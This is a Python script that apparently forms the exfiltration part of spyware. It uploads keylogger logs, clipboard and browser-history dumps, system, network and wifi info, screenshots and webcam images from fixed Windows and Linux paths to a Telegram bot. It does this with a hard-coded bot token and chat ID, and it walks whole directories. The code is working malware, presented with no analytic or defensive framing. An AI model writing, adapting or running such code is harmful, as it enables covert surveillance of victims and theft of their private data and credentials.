import os
import requests

telegram_token = '7135193352:AAHlCBhUPL-rJzOTcztoJcZ8wZ054kfKJM0'
telegram_chat_id = '1660587036'

def send_to_telegram(bot_token, chat_id, files):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

    for file_path in files:
        try:
            if os.path.isfile(file_path):  # Check if file_path is a file
                send_file(file_path, url, chat_id)
            elif os.path.isdir(file_path):  # Check if file_path is a directory
                for root, _, files_in_dir in os.walk(file_path):
                    for file_name in files_in_dir:
                        file_path_full = os.path.join(root, file_name)
                        send_file(file_path_full, url, chat_id)
            else:
                print(f"Invalid file_path: {file_path}")
        except Exception as e:
            print(f"Error sending {file_path} to Telegram: {e}")

def send_file(file_path, url, chat_id):
    with open(file_path, 'rb') as f:
        file_name = os.path.basename(file_path)
        files = {'document': (file_name, f)}
        params = {'chat_id': chat_id}
        response = requests.post(url, files=files, params=params)
        response.raise_for_status()
        print(f"File {file_name} sent successfully to Telegram")

if __name__ == "__main__":
    if os.name == 'nt':  # Check if running on Windows
        files_to_send = [
            'C:\\tmp\\keylogs.txt',
            'C:\\tmp\\clipboard.txt',
            'C:\\tmp\\browser_history.txt',
            'C:\\tmp\\system_info.txt',
            'C:\\tmp\\network_info.txt',
            'C:\\tmp\\screenshots',
            'C:\\tmp\\webcam_pics'
        ]
    else:  # Assume running on Linux or other Unix-like systems
        files_to_send = [
            '/tmp/logs/key_logs.txt',
            '/tmp/logs/wifi_info.txt',
            '/tmp/logs/browser_info.txt',
            '/tmp/logs/system_info.txt',
            '/tmp/logs/network_info.txt',
            '/tmp/logs/Screenshots',
            '/tmp/logs/WebcamPics'
        ]

    send_to_telegram(telegram_token, telegram_chat_id, files_to_send)
